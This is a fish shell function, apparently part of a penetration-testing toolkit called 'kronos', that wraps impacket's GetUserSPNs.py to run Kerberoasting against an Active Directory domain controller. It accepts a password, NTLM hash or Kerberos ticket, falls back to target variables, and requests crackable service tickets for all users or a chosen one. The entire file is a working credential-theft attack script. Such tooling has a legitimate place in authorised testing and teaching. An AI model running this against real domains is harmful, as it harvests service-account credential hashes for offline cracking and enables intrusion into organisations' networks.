# description: Run Kerberoasting using GetUserSPNs.py
function __kronos_kerbroast --description "Run Kerberoasting using GetUserSPNs.py"
    argparse h/help u/username= p/password= H/hash= d/domain= t/target= k/kerberos -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos kerbroast [TARGET] [OPTIONS]"
        echo ""
        echo "Run Kerberoasting using impacket's GetUserSPNs.py."
        echo ""
        echo "Arguments:"
        echo "  TARGET              DC IP, hostname, or nameserver (falls back to \$TGT_DC_IP or \$TGT_DC)"
        echo ""
        echo "Options:"
        echo "  -u, --username USER Provide username for authentication (falls back to \$TGT_CRED_USERNAME)"
        echo "  -p, --password PASS Provide password for authentication (falls back to \$TGT_CRED_PASSWORD)"
        echo "  -H, --hash HASH     Provide NTLM hash for authentication"
        echo "  -d, --domain DOMAIN Target domain (falls back to \$TGT_DC_DOMAIN)"
        echo "  -t, --target USER   Only roast this specific user (defaults to all users)"
        echo "  -k, --kerberos      Use Kerberos authentication (requires KRB5CCNAME)"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l target $argv[1]
    if test -z "$target"; set target $TGT_DC_IP; end
    if test -z "$target"; set target $TGT_DC; end
    if test -z "$target"; set target $TGT; end
    
    if test -z "$target"
        echo "error: target is required" >&2
        return 1
    end

    set -l domain $_flag_domain
    if test -z "$domain"; set domain $TGT_DC_DOMAIN; end
    if test -z "$domain"
        echo "error: domain is required" >&2
        return 1
    end

    set -l user $_flag_username; if test -z "$user"; set user $TGT_USERNAME; end
    if test -z "$user"; set user $TGT_CRED_USERNAME; end
    
    set -l pass $_flag_password; if test -z "$pass"; set pass $TGT_PASSWORD; end
    if test -z "$pass"; set pass $TGT_CRED_PASSWORD; end

    set -l impacket_cmd ""
    if command -v GetUserSPNs.py >/dev/null
        set impacket_cmd GetUserSPNs.py
    else if command -v impacket-GetUserSPNs >/dev/null
        set impacket_cmd impacket-GetUserSPNs
    else
        echo "error: GetUserSPNs not found. run 'kronos install'." >&2
        return 1
    end

    set -l roast_args -dc-ip "$target"
    if set -q _flag_kerberos
        set -a roast_args -k -no-pass "$domain/$user"
    else if set -q _flag_hash
        set -a roast_args -hashes "$_flag_hash" "$domain/$user"
    else
        if test -z "$user"; or test -z "$pass"
            echo "error: credentials or kerberos flag required" >&2
            return 1
        end
        set -a roast_args "$domain/$user:$pass"
    end

    if set -q _flag_target
        echo "[*] Kerberoasting specific user $_flag_target..."
        set -a roast_args -request-user "$_flag_target"
    else
        echo "[*] Kerberoasting all users..."
        set -a roast_args -request
    end

    echo "[*] Running $impacket_cmd against $target..."
    command $impacket_cmd $roast_args
end
